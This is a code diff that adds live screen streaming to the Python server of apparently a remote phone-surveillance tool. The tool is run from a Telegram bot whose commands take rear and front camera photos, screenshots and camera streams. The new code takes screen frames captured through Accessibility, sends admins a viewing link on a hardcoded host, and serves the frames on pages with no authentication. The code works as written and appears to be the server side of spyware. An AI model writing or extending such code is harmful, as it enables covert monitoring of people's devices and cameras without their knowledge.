@@ -251,6 +251,8 @@ COMMANDS = {
     "main-camera":               {"category": "camera", "label": "📷 كاميرا رئيسية",    "description": "تصوير بالكاميرا الخلفية",  "needs_param": False},
     "selfie-camera":             {"category": "camera", "label": "🤳 كاميرا سيلفي",     "description": "تصوير بالكاميرا الأمامية", "needs_param": False},
     "screenshot":                {"category": "camera", "label": "📸 لقطة شاشة",        "description": "التقاط صورة حقيقية من الشاشة", "needs_param": False},
+    "start-screen-stream":       {"category": "camera", "label": "📺 بث الشاشة",       "description": "بث مباشر للشاشة عبر Accessibility", "needs_param": False},
+    "stop-screen-stream":        {"category": "camera", "label": "⏹ إيقاف بث الشاشة",  "description": "إيقاف بث الشاشة", "needs_param": False},
     "start-camera-stream":       {"category": "camera", "label": "📺 بث الكاميرا (أمامية+خلفية)", "description": "بث مباشر للكاميرتين برابط واحد", "needs_param": False},
     "stop-camera-stream":        {"category": "camera", "label": "⏹ إيقاف بث الكاميرا",  "description": "إيقاف بث الكاميرا", "needs_param": False},
     # screenshot تمت إزالته - تمت إضافته في camera section
@@ -459,6 +461,7 @@ def camera_keyboard(did):
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(_cbtn(did,"main-camera"), _cbtn(did,"selfie-camera"))
     kb.add(_cbtn(did,"screenshot"))
+    kb.add(_cbtn(did,"start-screen-stream"), _cbtn(did,"stop-screen-stream"))
     kb.add(_cbtn(did,"start-camera-stream"))
     kb.add(_cbtn(did,"stop-camera-stream"))
     kb.add(_back(did))
@@ -1736,6 +1739,120 @@ def _api_camera_frame():
     except Exception as e:
         logger.error(f"❌ camera-frame API error: {e}")
         return jsonify({"success": False, "error": str(e)}), 500
+
+
+# ⚡⚡⚡ SOCKET.IO: screen_frame handler (بث الشاشة)
+_screen_streams: dict = {}  # stream_id → {jpeg, timestamp, device_id}
+
+@socketio.on("screen_frame")
+def _sock_screen_frame(data):
+    """يستقبل إطارات بث الشاشة من التطبيق"""
+    try:
+        if isinstance(data, list) and len(data) >= 2:
+            data = data[1]
+
+        stream_id = data.get("stream_id", "")
+        frame_type = data.get("type", "")
+
+        if frame_type == "screen_stream_start":
+            device_id = data.get("device_id", "?")
+            _screen_streams[stream_id] = {"jpeg": None, "timestamp": time.time(), "device_id": device_id}
+            logger.info(f"📺 Screen stream STARTED: {stream_id}")
+
+            if mdm_bot:
+                dev = dm.get_device_by_sid(request.sid)
+                short_label = _dev_label(dev) if dev else "?"
+                stream_url = f"https://one-1rre.onrender.com/screen-live/{stream_id}"
+                for admin_id in Config.ADMIN_IDS:
+                    try:
+                        mdm_bot.bot.send_message(admin_id,
+                            f"📺 <b>بث الشاشة المباشر</b>\n\n"
+                            f"📱 <b>{short_label}</b>\n"
+                            f"━━━━━━━━━━━━━━━\n"
+                            f"🔗 <a href=\"{stream_url}\">اضغط هنا لمشاهدة البث</a>\n\n"
+                            f"⏹ لإيقاف البث: اضغط زر إيقاف بث الشاشة",
+                            parse_mode="HTML")
+                    except Exception as e:
+                        logger.error(f"❌ Screen stream URL error: {e}")
+            return
+
+        if frame_type == "screen_stream_stop":
+            if stream_id in _screen_streams:
+                del _screen_streams[stream_id]
+            logger.info(f"⏹ Screen stream STOPPED: {stream_id}")
+            return
+
+        # إطار عادي
+        b64image = data.get("image", "")
+        if b64image and stream_id in _screen_streams:
+            import base64 as _b64
+            jpeg_bytes = _b64.b64decode(b64image)
+            _screen_streams[stream_id] = {
+                "jpeg": jpeg_bytes,
+                "timestamp": time.time(),
+                "device_id": _screen_streams[stream_id].get("device_id", "?")
+            }
+
+    except Exception as e:
+        logger.error(f"❌ screen_frame error: {e}")
+
+
+# ⚡ صفحة ويب لبث الشاشة
+@app.route("/screen-live/<stream_id>")
+def _screen_live_page(stream_id):
+    if stream_id not in _screen_streams:
+        return make_response("<h1>البث غير نشط</h1>", 404)
+
+    html = f"""<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بث الشاشة المباشر</title>
+    <style>
+        body {{ margin:0; background:#111; color:#fff; font-family:Arial,sans-serif; }}
+        .header {{ background:#222; padding:10px; text-align:center; }}
+        .frame {{ width:100%; max-width:800px; margin:10px auto; display:block; border:2px solid #333; border-radius:5px; }}
+        .status {{ text-align:center; font-size:12px; color:#888; padding:5px; }}
+    </style>
+</head>
+<body>
+    <div class="header"><h2>📺 بث الشاشة المباشر</h2></div>
+    <img id="screen" class="frame" src="" alt="انتظار..." />
+    <div class="status" id="status">جاري التحميل...</div>
+    <script>
+        var streamId = "{stream_id}";
+        var count = 0;
+        function poll() {{
+            fetch('/screen-frame/' + streamId)
+                .then(r => r.blob())
+                .then(blob => {{
+                    if (blob.size > 100) {{
+                        document.getElementById('screen').src = URL.createObjectURL(blob);
+                        count++;
+                        document.getElementById('status').textContent = '✅ مباشر - إطار #' + count;
+                    }}
+                }})
+                .catch(err => {{
+                    document.getElementById('status').textContent = '❌ خطأ: ' + err;
+                }});
+        }}
+        setInterval(poll, 200);
+    </script>
+</body>
+</html>"""
+    return html
+
+
+@app.route("/screen-frame/<stream_id>")
+def _get_screen_frame(stream_id):
+    if stream_id not in _screen_streams:
+        return make_response("", 404)
+    info = _screen_streams[stream_id]
+    jpeg = info.get("jpeg")
+    if not jpeg:
+        return make_response("", 404)
+    return Response(jpeg, mimetype="image/jpeg")
 
 
 @socketio.on("camera_frame")
